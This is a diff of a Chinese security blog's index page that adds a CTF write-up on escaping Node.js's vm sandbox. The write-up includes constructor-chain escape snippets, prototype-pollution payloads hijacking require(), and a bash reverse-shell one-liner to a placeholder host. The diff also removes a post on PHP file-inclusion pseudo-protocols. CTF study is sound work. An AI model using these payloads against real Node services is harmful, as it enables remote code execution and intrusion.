@@ -73,6 +73,72 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-NKCTF-vm" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/26/NKCTF-vm/" class="article-date">
+  <time class="dt-published" datetime="2024-03-26T00:48:22.000Z" itemprop="datePublished">2024-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/26/NKCTF-vm/">NKCTF-vm</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">1 const express = require(&#x27;express&#x27;);</span><br><span class="line">2 const bodyParser = require(&#x27;body-parser&#x27;);</span><br><span class="line">3 const app = express();</span><br><span class="line">4 const fs = require(&quot;fs&quot;);</span><br><span class="line">5 const path = require(&#x27;path&#x27;);</span><br><span class="line">6 const vm = require(&quot;vm&quot;);</span><br><span class="line">7</span><br><span class="line">8 app</span><br><span class="line">9 .use(bodyParser.json())</span><br><span class="line">10 .set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;))</span><br><span class="line">11 .use(express.static(&#x27;public&#x27;))</span><br><span class="line">12</span><br><span class="line">13 app.get(&#x27;/&#x27;, function (req, res)&#123;</span><br><span class="line">14 res.sendFile(__dirname + &#x27;/public/home.html&#x27;);</span><br><span class="line">15 &#125;)</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18 function waf(code) &#123;</span><br><span class="line">19 let pattern = /(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval</span><br><span class="line">|Function)/g;</span><br><span class="line">20 if(code.match(pattern))&#123;</span><br><span class="line">21 throw new Error(&quot;what can I say? hacker out!!&quot;);</span><br><span class="line">22 &#125;</span><br><span class="line">23 &#125;</span><br><span class="line">24</span><br><span class="line">25 app.post(&#x27;/&#x27;, function (req, res)&#123;</span><br><span class="line">26 let code = req.body.code;</span><br><span class="line">27 let sandbox = Object.create(null);</span><br><span class="line">28 let context = vm.createContext(sandbox);</span><br><span class="line">29 try &#123;</span><br><span class="line">30 waf(code)</span><br><span class="line">31 let result = vm.runInContext(code, context);</span><br><span class="line">32 console.log(result);</span><br><span class="line">33 &#125; catch (e)&#123;</span><br><span class="line">34 console.log(e.message);</span><br><span class="line">35 require(&#x27;./hack&#x27;);</span><br><span class="line">36 &#125;</span><br><span class="line">37 &#125;)</span><br><span class="line">38</span><br><span class="line">39 app.get(&#x27;/secret&#x27;, function (req, res)&#123;</span><br><span class="line">40 if(process.__filename == null) &#123;</span><br><span class="line">41 let content = fs.readFileSync(__filename, &quot;utf-8&quot;);</span><br><span class="line">42 return res.send(content);</span><br><span class="line">43 &#125; else &#123;</span><br><span class="line">44 let content = fs.readFileSync(process.__filename, &quot;utf-8&quot;);</span><br><span class="line">45 return res.send(content);</span><br><span class="line">46 &#125;</span><br><span class="line">47 &#125;)</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50 app.listen(3000, ()=&gt;&#123;</span><br><span class="line">51 console.log(&quot;listen on 3000&quot;);</span><br><span class="line">52 &#125;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>vm逃逸</strong></p>
+<p>防止变量的污染，VM的特点就是不受环境的影响，也可以说他就是一个 沙箱环境 （沙箱模式给模块提供一个环境运行而不影响其它模块和它们私有的沙箱）。 </p>
+<p>如果我们正常执行命令的话是怎么执行的呢，一般都是通过child_process模块，而在沙箱中又不能直接通过require引入child_process，而require的话是可以从process对象中进行获取的，所以这里最终要获取的其实就是process模块，一般都是如下获取 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const vm = require(&#x27;vm&#x27;);</span><br><span class="line">const y1 = vm.runInNewContext(`this.toString.constructor(&quot;return process&quot;)();`);</span><br><span class="line">console.log(y1.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p>如果在runInNewContext想要通过逃逸的话可以通过<code>this.constructor.constructor(&quot;return process&quot;)()</code> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const vm = require(&#x27;vm&#x27;);</span><br><span class="line">const result = vm.runInNewContext(`this.constructor.constructor(&quot;return process&quot;)()`);</span><br><span class="line">result.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>具体的原因就是在this这个位置上，this指向context（上面的代码中就是默认vm创建的context）并通过原型链的方式拿到Funtion </p>
+<hr>
+<p>&#x2F;secret 中对 process.__filename 有一个判断，正常情况下，process 是没有 __<br>filename 这个属性的，猜测这里可以原型链污染</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">2 get: function()&#123;</span><br><span class="line">3 const cc = arguments.callee.caller;</span><br><span class="line">4 cc.__proto__.__proto__.__filename = &quot;/etc/passwd&quot;;</span><br><span class="line">5 &#125;</span><br><span class="line">6 &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>这样就污染了 Object 的__filename 属性，process 因为找不到__filename 这个属性，就会到<br>prototype 里去找，最终在 Object 找到这个属性，观察源码可以发现 require(‘.&#x2F;hack’) ，<br>污染 process.__filename 为 &#x2F;app&#x2F;hack.js ，访问 &#x2F;secret，读取到 hack.js 的内容为 : </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 console.log(&#x27;shell.js&#x27;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 console.log(&quot;shell&quot;);</span><br><span class="line">2 const p = require(&#x27;child_process&#x27;);</span><br><span class="line">3 p.execSync(process.env.command);</span><br></pre></td></tr></table></figure>
+
+<p>这里很明显 process.env.command 也能进行污染控制，问题是怎么 include shell.js，漏洞点 </p>
+<p>在 require(‘&#x2F;hack’) ，打断点进入 require 方法调试，可以发现里面可以通过原型链污染控 </p>
+<p>制某些属性的值，可以达到任意文件包含的效果，调试过程可以参考 <a target="_blank" rel="noopener" href="https://hujiekang.top/p">https://hujiekang.top/p</a> </p>
+<p>osts&#x2F;nodejs-require-rce&#x2F;，我们构造 payload 包含 shell.js，就可以 rce 了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1 throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">2 get: function()&#123;</span><br><span class="line">3 const cc = arguments.callee.caller;</span><br><span class="line">4 cc.__proto__.__proto__.data = &#123;&quot;name&quot;: &quot;./hack&quot;,&quot;exports&quot;: </span><br><span class="line">&quot;./shell.js&quot;&#125;;</span><br><span class="line">5 cc.__proto__.__proto__.path = &quot;/app&quot;;</span><br><span class="line">6 cc.__proto__.__proto__.command = &quot;bash -c &#x27;bash -i &gt;&amp; /dev/</span><br><span class="line">tcp/vps/port 0&gt;&amp;1&#x27;&quot;;</span><br><span class="line">7 &#125;</span><br><span class="line">8 &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>拿到 shell，执行 &#x2F;readflag </p>
+<p>先把wp抄上，还有不理解的地方，找到 [HZNUCTF 2023 final]eznode 练习一下再来研究</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/03/26/NKCTF-vm/" data-id="clu7pilys0001r0b5cw5fhhzz" data-title="NKCTF-vm" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-无列名注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/03/25/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" class="article-date">
@@ -107,7 +173,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/25/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" data-id="clu7mmllm000pb4b5c1n28u3c" data-title="无列名注入" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/25/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" data-id="clu7pilz0000nr0b5gbfsfezi" data-title="无列名注入" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -209,7 +275,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/17/java%E7%A8%8D%E8%BF%9B%E9%98%B6/" data-id="clu7mmllf0004b4b5bvi96yv5" data-title="java稍进阶" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/17/java%E7%A8%8D%E8%BF%9B%E9%98%B6/" data-id="clu7pilyt0003r0b5bh3j7axw" data-title="java稍进阶" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -325,7 +391,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/15/Java%E5%9F%BA%E7%A1%80/" data-id="clu7mmlla0000b4b564gfc7qp" data-title="Java基础" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/15/Java%E5%9F%BA%E7%A1%80/" data-id="clu7pilyp0000r0b59sq4djma" data-title="Java基础" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -393,7 +459,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/12/XXE/" data-id="clu7mmlle0002b4b53s8vbi0f" data-title="XXE" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/12/XXE/" data-id="clu7pilyu0007r0b58n7t9h3v" data-title="XXE" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -456,7 +522,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/07/ssrf/" data-id="clu7mmlli000fb4b58o1qbtyq" data-title="ssrf" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/07/ssrf/" data-id="clu7pilyx000fr0b55bffb2xy" data-title="ssrf" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -601,7 +667,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/05/%E5%8E%9F%E7%94%9F%E7%B1%BB/" data-id="clu7mmllj000jb4b53rdqgbng" data-title="原生类" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/05/%E5%8E%9F%E7%94%9F%E7%B1%BB/" data-id="clu7pilz3000pr0b56czfdm0s" data-title="原生类" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -657,7 +723,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/04/phototype-1/" data-id="clu7mmllg0007b4b56v4gbb2a" data-title="phototype_1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/04/phototype-1/" data-id="clu7pilyu0006r0b5fowefphe" data-title="phototype_1" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -723,7 +789,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/03/phototype/" data-id="clu7mmllf0003b4b52ewybd0a" data-title="phototype" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/03/phototype/" data-id="clu7pilyu0005r0b594u85jvc" data-title="phototype" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -819,63 +885,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/03/n-ez-unserilize/" data-id="clu7mmllg0005b4b57hrb09dn" data-title="n_ez_unserilize" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-文件上传" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
-  <time class="dt-published" datetime="2024-02-29T07:33:02.000Z" itemprop="datePublished">2024-02-29</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>文件包含漏洞</strong></p>
-<p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用此文件，无需再次编写，这种调用文件的过程通常称为包含 </p>
-<p>成因：文件包含函数加载的参数没有经过过滤或严格定义，可以被用户控制，包含其他恶意文件，导致了执行非预期代码。</p>
-<p>程序开发人员都希望代码更加灵活，所以通常会把被包含的文件设置为变量来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用任意文件，造成文件包含漏洞</p>
-<p><strong>文件包含函数</strong></p>
-<p>常用的文件包含函数有以下四种<br>include(),require(),include_once(),require_once() </p>
-<pre><code>require():找不到被包含的文件会产生致命错误，并停止脚本运行
-include():找不到被包含的文件只会产生警告，脚本继续执行
-require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含
-include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含
-</code></pre>
-<p><strong>php伪协议</strong></p>
-<p><strong>file:&#x2F;&#x2F;</strong> 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响 </p>
-<p><strong>php:&#x2F;&#x2F;filter</strong>用于读取源码。<br><strong>php:&#x2F;&#x2F;input</strong>用于执行php代码。 </p>
-<p><strong>php:&#x2F;&#x2F;input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。 </p>
-<p><strong>zip:&#x2F;&#x2F;</strong> 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。 </p>
-<p><strong>data:&#x2F;&#x2F;</strong> 同样类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。 </p>
-<p><strong>phar:&#x2F;&#x2F;</strong> 不管后缀如何，都当作压缩包解压</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="clu7mmllm000ob4b5alqe0cwj" data-title="文件上传" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/03/n-ez-unserilize/" data-id="clu7pilyu0004r0b554m2bleq" data-title="n_ez_unserilize" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -937,6 +947,10 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
       <ul>
         
           <li>
+            <a href="/2024/03/26/NKCTF-vm/">NKCTF-vm</a>
+          </li>
+        
+          <li>
             <a href="/2024/03/25/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">无列名注入</a>
           </li>
         
@@ -950,10 +964,6 @@ include_once()与include()类似:唯一的区别是如果该文件的代码已�
         
           <li>
             <a href="/2024/03/12/XXE/">XXE</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/07/ssrf/">ssrf</a>
           </li>
         
       </ul>
